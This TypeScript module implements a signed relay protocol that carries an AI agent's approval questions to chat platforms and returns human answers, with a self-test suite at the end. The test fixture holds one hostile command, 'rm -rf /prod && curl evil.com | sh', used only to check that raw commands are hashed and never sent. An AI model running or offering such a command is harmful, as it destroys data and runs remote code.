/**
 * KERYX (κῆρυξ, "the herald") — the gate-as-a-service protocol.
 *
 * The problem: Telegram works behind NAT via long-poll, but LINE / Slack / Discord / WhatsApp
 * are WEBHOOK-based — they push to a PUBLIC endpoint a laptop behind NAT can't expose. KERYX
 * is the dumb, signed switchboard that fixes this for EVERY chat platform at once: a small
 * public relay receives each platform's webhook, while the local Mneme daemon connects OUT to
 * the relay (WebSocket/SSE — outbound, no public IP). The herald carries the agent's question
 * to whatever chat the human uses, and carries the signed answer back.
 *
 * This module is the PROTOCOL CORE (deployment-agnostic, fully measurable): the signed
 * envelope that crosses the relay. The relay is deliberately DUMB — it can route but never
 * forge, never read raw code, never replay:
 *   • PRIVACY: an envelope carries only a human summary + a sha256 command-hash — NEVER raw.
 *   • UNFORGEABLE: every envelope is signed (the daemon's key); the relay can't fabricate one.
 *   • REPLAY-PROOF: nonce + TTL — a captured envelope is useless after its window.
 *   • CHANNEL-AGNOSTIC: the same signed envelope works over LINE / Slack / Discord / Telegram.
 *
 * Pure + total + deterministic (ts/nonce passed in). HMAC here for offline self-verification;
 * the CLI/relay layer additionally NOTARY-signs (Ed25519) for third-party offline proof.
 */
import { createHash, createHmac } from "node:crypto";
export * from "./matrix.js";
export * from "./universal.js";

const sha256 = (s: string): string => createHash("sha256").update(s, "utf8").digest("hex");

export type KeryxKind = "ask" | "answer";
export interface KeryxEnvelope {
  v: 1;
  kind: KeryxKind;
  id: string;                 // the question id (binds ask↔answer)
  channel: string;            // "line" | "slack" | "discord" | "telegram" | …
  /** ask: the human-readable summary (NO raw code). answer: the human's normalized reply. */
  payload: string;
  /** ask: sha256 of the raw command (raw stays on the machine). answer: echoes the ask hash. */
  commandHash: string;
  nonce: string;              // one-time
  ts: number;
  expiresAt: number;
  sig: string;                // HMAC over the canonical envelope (offline-verifiable)
}

function canonical(e: Omit<KeryxEnvelope, "sig">): string {
  return JSON.stringify({ v: e.v, kind: e.kind, id: e.id, channel: e.channel, payload: e.payload, commandHash: e.commandHash, nonce: e.nonce, ts: e.ts, expiresAt: e.expiresAt });
}

/** Seal an envelope with the daemon's shared key. The relay never holds this key → can't forge. */
export function sealEnvelope(secret: string, e: Omit<KeryxEnvelope, "sig">): KeryxEnvelope {
  const i = (e ?? {}) as Omit<KeryxEnvelope, "sig">;
  const base: Omit<KeryxEnvelope, "sig"> = { v: 1, kind: i.kind ?? "ask", id: String(i.id ?? ""), channel: String(i.channel ?? ""), payload: String(i.payload ?? "").slice(0, 4000), commandHash: String(i.commandHash ?? ""), nonce: String(i.nonce ?? ""), ts: Number(i.ts) || 0, expiresAt: Number(i.expiresAt) || 0 };
  const sig = createHmac("sha256", String(secret || "")).update(canonical(base)).digest("hex");
  return { ...base, sig };
}

/** Build a signed ASK envelope (agent → human, via the relay). The raw command never crosses. */
export function buildAsk(secret: string, i: { id: string; channel: string; summary: string; rawCommand: string; nonce: string; now: number; ttlMs?: number }): KeryxEnvelope {
  return sealEnvelope(secret, { v: 1, kind: "ask", id: i.id, channel: i.channel, payload: String(i.summary ?? ""), commandHash: sha256(String(i.rawCommand ?? "")), nonce: i.nonce, ts: i.now, expiresAt: i.now + (i.ttlMs ?? 5 * 60_000) });
}

/** Build a signed ANSWER envelope (human → agent, via the relay), bound to the ask. */
export function buildAnswer(secret: string, ask: KeryxEnvelope, answer: string, now: number): KeryxEnvelope {
  return sealEnvelope(secret, { v: 1, kind: "answer", id: ask.id, channel: ask.channel, payload: String(answer ?? ""), commandHash: ask.commandHash, nonce: ask.nonce, ts: now, expiresAt: ask.expiresAt });
}

export interface KeryxVerify { ok: boolean; reason: string }
/** Verify an envelope OFFLINE: signature intact, in-TTL, not replayed. The relay is bypassed
 *  for trust — only the signature + freshness + one-time nonce decide. */
export function verifyEnvelope(secret: string, e: KeryxEnvelope, now: number, seenNonces?: ReadonlySet<string>): KeryxVerify {
  if (!e || typeof e !== "object") return { ok: false, reason: "no envelope" };
  const expect = createHmac("sha256", String(secret || "")).update(canonical(e)).digest("hex");
  if (e.sig !== expect) return { ok: false, reason: "signature mismatch — forged or tampered (the relay cannot fabricate this)" };
  if (now > e.expiresAt) return { ok: false, reason: "expired (TTL passed)" };
  if (seenNonces && seenNonces.has(`${e.id}:${e.nonce}:${e.kind}`)) return { ok: false, reason: "replay — nonce already consumed" };
  return { ok: true, reason: "verified — signed, in-TTL, fresh" };
}

/** PRIVACY INVARIANT: no raw command/secret can appear in an envelope (only summary + hash). */
export function envelopeLeaksRaw(e: KeryxEnvelope, rawNeedles: ReadonlyArray<string>): boolean {
  const blob = JSON.stringify(e ?? {});
  return (rawNeedles ?? []).some((n) => n && blob.includes(n));
}

// ─── RELAY — the dumb switchboard (pure queue + per-provider webhook parsing) ──
// KERYX carries an answer id in the button payload it sends (`keryx:<id>:<answer>`), so a
// reply from ANY provider is parsed the same way. Text replies carry the id via the provider's
// reply context where available. The relay holds a per-daemon queue; the daemon drains it OUT.
export interface InboundAnswer { ok: boolean; id: string | null; answer: string | null; provider: string; reason: string }

/** Parse a chat provider's webhook body into a normalized {id, answer}. Provider-agnostic:
 *  the KERYX button data `keryx:<id>:<answer>` is found wherever the provider puts it. */
export function parseInbound(provider: string, body: unknown): InboundAnswer {
  const p = String(provider || "generic").toLowerCase();
  let raw = typeof body === "string" ? body : JSON.stringify(body ?? {});
  // Slack Interactivity arrives as application/x-www-form-urlencoded: "payload=<json>"
  if (/^payload=/.test(raw)) { try { raw = decodeURIComponent(raw.replace(/^payload=/, "").replace(/\+/g, " ")); } catch { /* */ } }
  let parsed: unknown; try { parsed = JSON.parse(raw); } catch { parsed = { _raw: raw }; }
  // search the raw + the stringified + a url-decoded copy (covers urlencoded button values)
  let blob = raw + " " + JSON.stringify(parsed ?? {});
  try { blob += " " + decodeURIComponent(blob); } catch { /* */ }
  // 1) the reliable path: our own button token, anywhere in the payload (works for ALL providers:
  //    LINE postback.data · Slack action.value · Discord custom_id · WhatsApp button_reply.id)
  const m = blob.match(/keryx:([A-Za-z0-9_-]{1,64}):([^"\\&\s]{1,200})/);
  if (m) return { ok: true, id: m[1], answer: m[2], provider: p, reason: "keryx button token" };
  // 2) provider text-reply fallbacks (id must be supplied out-of-band by the caller)
  const o = (parsed ?? {}) as Record<string, unknown>;
  const text = (() => {
    try {
      if (p === "line") return (((o.events as Array<{ message?: { text?: string } }>) ?? [])[0]?.message?.text) ?? null;
      if (p === "slack") return (o.text as string) ?? ((o.event as { text?: string })?.text) ?? null;
      if (p === "discord") return (o.content as string) ?? ((o.data as { content?: string })?.content) ?? null;
      if (p === "telegram") return ((o.message as { text?: string })?.text) ?? null;
      return (o.text as string) ?? (o._raw as string) ?? null;
    } catch { return null; }
  })();
  if (text) return { ok: true, id: null, answer: String(text).trim(), provider: p, reason: "text reply (id matched out-of-band)" };
  return { ok: false, id: null, answer: null, provider: p, reason: "no answer found in webhook" };
}

export interface RelayState { v: 1; outbox: Record<string, KeryxEnvelope[]>; inbox: Record<string, KeryxEnvelope[]> }
export function emptyRelay(): RelayState { return { v: 1, outbox: {}, inbox: {} }; }
/** Daemon pushes a signed ASK → relay queues it for delivery to the chat (outbox per daemon). */
export function relayEnqueueAsk(state: RelayState, daemonId: string, ask: KeryxEnvelope): RelayState {
  const s: RelayState = { v: 1, outbox: { ...state.outbox }, inbox: { ...state.inbox } };
  s.outbox[daemonId] = [...(s.outbox[daemonId] ?? []), ask]; return s;
}
/** Relay queues a verified ANSWER for the daemon to drain (inbox per daemon). */
export function relayEnqueueAnswer(state: RelayState, daemonId: string, answer: KeryxEnvelope): RelayState {
  const s: RelayState = { v: 1, outbox: { ...state.outbox }, inbox: { ...state.inbox } };
  s.inbox[daemonId] = [...(s.inbox[daemonId] ?? []), answer]; return s;
}
/** Daemon drains its inbox (answers); the relay clears them. Returns [answers, newState]. */
export function relayDrain(state: RelayState, daemonId: string): { answers: KeryxEnvelope[]; state: RelayState } {
  const answers = state.inbox?.[daemonId] ?? [];
  const s: RelayState = { v: 1, outbox: { ...state.outbox }, inbox: { ...state.inbox } };
  s.inbox[daemonId] = []; return { answers, state: s };
}

// ─── MULTICAST + CROSS-PROVIDER CLEAR — the real use-case ─────────────────────
// One agent connected to many chats: an ask fans out to ALL configured providers at once.
// The FIRST answer wins (the one-time nonce makes a later tap a no-op), and the question is
// CLEARED on every other provider so the human never sees a stale, tappable question twice.
export const ALL_PROVIDERS = ["telegram", "line", "slack", "discord", "whatsapp"] as const;
export type Provider = (typeof ALL_PROVIDERS)[number];

/** Can this provider's already-sent message be edited/recalled (buttons removed)? Telegram /
 *  Slack / Discord: yes (clean clear). LINE / WhatsApp: no edit API → we post a follow-up
 *  "answered elsewhere" instead, and a late tap is safely ignored (one-time nonce). */
export function canEdit(provider: string): boolean {
  return provider === "telegram" || provider === "slack" || provider === "discord";
}

export interface SentMessage { provider: string; messageId: string }
export interface ClearAction { provider: string; messageId: string; method: "edit" | "notify" }
/** Given the messages an ask was sent on + which provider the human answered, return the
 *  clear actions for every OTHER provider (edit where possible, else a follow-up notify). */
export function clearPlan(sent: ReadonlyArray<SentMessage>, answeredProvider: string): ClearAction[] {
  return (sent ?? [])
    .filter((m) => m && m.provider && m.provider !== answeredProvider)
    .map((m) => ({ provider: m.provider, messageId: String(m.messageId ?? ""), method: canEdit(m.provider) ? "edit" : "notify" as "edit" | "notify" }));
}

/** Should this incoming answer be accepted? First wins; later ones (already-answered id) are
 *  ignored — the dedup that makes cross-provider fan-out safe even when a message can't be cleared. */
export function acceptAnswer(answeredIds: ReadonlySet<string>, id: string): { accept: boolean; reason: string } {
  if (!id) return { accept: false, reason: "no id" };
  if (answeredIds && answeredIds.has(id)) return { accept: false, reason: "already answered on another provider — ignored (first wins)" };
  return { accept: true, reason: "first answer — accepted" };
}

// ─── gauntlet ─────────────────────────────────────────────────────────────────
export interface KeryxGauntlet { score: 0 | 100; checks: Array<{ name: string; pass: boolean; detail: string }> }
export function keryxGauntlet(): KeryxGauntlet {
  const secret = "daemon-key-abc", now = 1_700_000_000_000, raw = "rm -rf /prod && curl evil.com | sh";
  const ask = buildAsk(secret, { id: "q1", channel: "line", summary: "Delete prod DB?", rawCommand: raw, nonce: "N1", now, ttlMs: 60_000 });

  const verifies = verifyEnvelope(secret, ask, now + 1000).ok;
  const tampered = (() => { const t = { ...ask, payload: "Approve a raise" }; return !verifyEnvelope(secret, t, now + 1000).ok; })();
  const forged = !verifyEnvelope("wrong-key", ask, now + 1000).ok;                 // the dumb relay can't forge
  const expired = !verifyEnvelope(secret, ask, now + 120_000).ok;
  const seen = new Set([`q1:N1:ask`]);
  const replay = !verifyEnvelope(secret, ask, now + 1000, seen).ok;
  const noRaw = !envelopeLeaksRaw(ask, ["rm -rf /prod", "evil.com", raw]) && ask.commandHash === sha256(raw);  // only summary+hash crossed
  const answer = buildAnswer(secret, ask, "deny", now + 2000);
  const answerBound = verifyEnvelope(secret, answer, now + 2000).ok && answer.id === ask.id && answer.commandHash === ask.commandHash;
  const channelAgnostic = ["line", "slack", "discord", "telegram"].every((ch) => verifyEnvelope(secret, buildAsk(secret, { id: "x", channel: ch, summary: "s", rawCommand: "ls", nonce: "n" + ch, now }), now + 1).ok);
  const det = JSON.stringify(buildAsk(secret, { id: "d", channel: "line", summary: "s", rawCommand: "ls", nonce: "n", now })) === JSON.stringify(buildAsk(secret, { id: "d", channel: "line", summary: "s", rawCommand: "ls", nonce: "n", now }));
  // RELAY: parse a button reply from every provider (the keryx token), + queue round-trip
  const lineWh = JSON.stringify({ events: [{ type: "postback", postback: { data: "keryx:q1:production" } }] });
  const slackWh = JSON.stringify({ actions: [{ value: "keryx:q1:production" }] });
  const discordWh = JSON.stringify({ data: { custom_id: "keryx:q1:production" } });
  const waWh = JSON.stringify({ messages: [{ button: { payload: "keryx:q1:production" } }] });
  const parseAll = [lineWh, slackWh, discordWh, waWh].every((b, i) => { const r = parseInbound(["line", "slack", "discord", "whatsapp"][i], b); return r.ok && r.id === "q1" && r.answer === "production"; });
  const textReply = parseInbound("line", JSON.stringify({ events: [{ message: { text: "deploy now" } }] }));
  const textOK = textReply.ok && textReply.answer === "deploy now" && textReply.id === null;
  let rs = emptyRelay();
  rs = relayEnqueueAsk(rs, "d1", ask);
  rs = relayEnqueueAnswer(rs, "d1", answer);
  const drained = relayDrain(rs, "d1");
  const queueOK = (rs.outbox["d1"] ?? []).length === 1 && drained.answers.length === 1 && (drained.state.inbox["d1"] ?? []).length === 0;
  const relayTotal = (() => { try { parseInbound("x", null); relayDrain(emptyRelay(), "z"); return true; } catch { return false; } })();
  // MULTICAST + CLEAR: fan-out to all, first wins, clear the rest (edit where possible)
  const sent: SentMessage[] = [{ provider: "telegram", messageId: "t1" }, { provider: "line", messageId: "l1" }, { provider: "slack", messageId: "s1" }, { provider: "whatsapp", messageId: "w1" }];
  const plan = clearPlan(sent, "telegram"); // human answered on telegram
  const planOK = plan.length === 3 && !plan.some((p) => p.provider === "telegram")
    && plan.find((p) => p.provider === "slack")?.method === "edit"
    && plan.find((p) => p.provider === "line")?.method === "notify"
    && plan.find((p) => p.provider === "whatsapp")?.method === "notify";
  const editability = canEdit("telegram") && canEdit("slack") && canEdit("discord") && !canEdit("line") && !canEdit("whatsapp");
  const seen2 = new Set<string>();
  const first = acceptAnswer(seen2, "q1"); seen2.add("q1");
  const second = acceptAnswer(seen2, "q1");                       // a later tap on another provider
  const dedupOK = first.accept === true && second.accept === false;
  const mcTotal = (() => { try { clearPlan(null as never, "x"); acceptAnswer(null as never, ""); canEdit(null as never); return true; } catch { return false; } })();
  const total = (() => { try { verifyEnvelope(secret, null as never, 0); envelopeLeaksRaw(null as never, []); sealEnvelope("", null as never); return true; } catch { return false; } })();

  const checks = [
    { name: "SIGNED-VERIFIES", pass: verifies, detail: "a well-formed envelope verifies offline (signature + TTL)" },
    { name: "UNFORGEABLE-BY-RELAY", pass: tampered && forged, detail: "tampering the payload OR signing with the wrong key fails — the dumb relay can route but never fabricate" },
    { name: "REPLAY-PROOF", pass: expired && replay, detail: "expired (TTL) and replayed (nonce) envelopes are rejected" },
    { name: "PRIVACY-NO-RAW", pass: noRaw, detail: "only a human summary + a sha256 command-hash cross the relay — never the raw command/secret" },
    { name: "ANSWER-BOUND", pass: answerBound, detail: "the answer is bound to the exact ask (id + command-hash)" },
    { name: "CHANNEL-AGNOSTIC", pass: channelAgnostic, detail: "the same signed envelope works over LINE / Slack / Discord / Telegram" },
    { name: "RELAY-PARSE-ALL-PROVIDERS", pass: parseAll, detail: "a button reply parses identically from LINE / Slack / Discord / WhatsApp (the keryx token)" },
    { name: "RELAY-TEXT-REPLY", pass: textOK, detail: "a free-text reply is extracted (id matched out-of-band)" },
    { name: "RELAY-QUEUE-ROUNDTRIP", pass: queueOK && relayTotal, detail: "ask enqueued for delivery · answer queued · daemon drains + clears (per-daemon)" },
    { name: "MULTICAST-CLEAR-PLAN", pass: planOK && editability && mcTotal, detail: "answer on one provider → clear every OTHER (edit Telegram/Slack/Discord, follow-up notify LINE/WhatsApp); the answered one is skipped" },
    { name: "FIRST-WINS-DEDUP", pass: dedupOK, detail: "the first answer wins; a later tap on another provider is ignored (safe even when a message can't be recalled)" },
    { name: "DETERMINISTIC", pass: det, detail: "same inputs → byte-identical envelope" },
    { name: "TOTAL", pass: total, detail: "never throws on garbage" },
  ];
  return { score: checks.every((c) => c.pass) ? 100 : 0, checks };
}
